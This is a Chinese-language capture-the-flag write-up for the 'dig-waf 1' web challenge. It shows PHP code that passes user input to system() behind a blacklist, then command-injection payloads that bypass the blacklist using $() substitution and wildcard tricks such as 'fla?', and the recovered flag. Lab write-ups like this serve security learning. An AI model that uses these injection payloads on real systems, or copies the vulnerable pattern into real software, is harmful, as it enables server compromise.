#Web

## 題目

**dig-waf 1**
給了一個網址，跟 [[Dig]] 的長一樣，但前端多了限制
```php
 <?php if (isset($_POST['name'])) : ?>
<p>                         
	<?php
		$blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
		$is_bad = false;
		foreach ($blacklist as $bad_word)
			if (strpos($_POST['name'], $bad_word) !== false) $is_bad = true;

		if ($is_bad)
			echo "BAD HACKER!!!";
		else
			system("dig '" . $_POST['name'] . "';");
	?>
</p>
<?php endif; ?>
```

## 解題
1. 觀察網頁，發現有前端過濾符號 -> 想辦法不用這些符號使 shell 能解析
   ```php
	$blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
   ```
2. 找「在目前指令中執行另一條指令」的 shell 語法
   >[!abstract] 「在目前指令中執行另一條指令」的 shell 語法
   >   - `$(command)`：
   >     ex: `echo $(whoami)` 中，會先執行 `whoami` 再執行 `echo`
   >   - `<(command)`：
   >     ex: `cat <(printf 'hello')`中，會先執行 `printf 'hello'` 再執行 `cat`
   >   - `(command)`：括號內會在 subshell 中執行，但<mark style="background: #FFF3A3A6;">需要是獨立一個 command</mark>
   
   --> 嘗試 `$()`
1. 輸入 `aaa' $(ls /)'`
   ![[W1-13_ls.png]]![[W1-13_badHacker.png|263]]
   --> 被抓 "flag" 了 QQ
   --> 改搜尋檔案名稱的寫法
2. 改搜尋檔案名稱的寫法
   >[!abstract] Shell 中不讓原始輸入直接出現特定詞彙的方法
   >以 flag 為例:
   >- fla? ：`?` 表示「一定有一個」的任意字元
   >- fl* ：表示所有以 `fl` 開頭的名稱
   >- fl[abc]g：`[]` 代表一定有一個字元符合括號內的其中一個
   >- 'fl''ag'：shell 字串拼接
3. 嘗試 `aaa' $(cat /fla?_o2837ry)'`
   ![[W1-13_flag.png|513]]
4. flag = `CTF{digtools_waf1_3134b58b999e7670f41e8fa9}`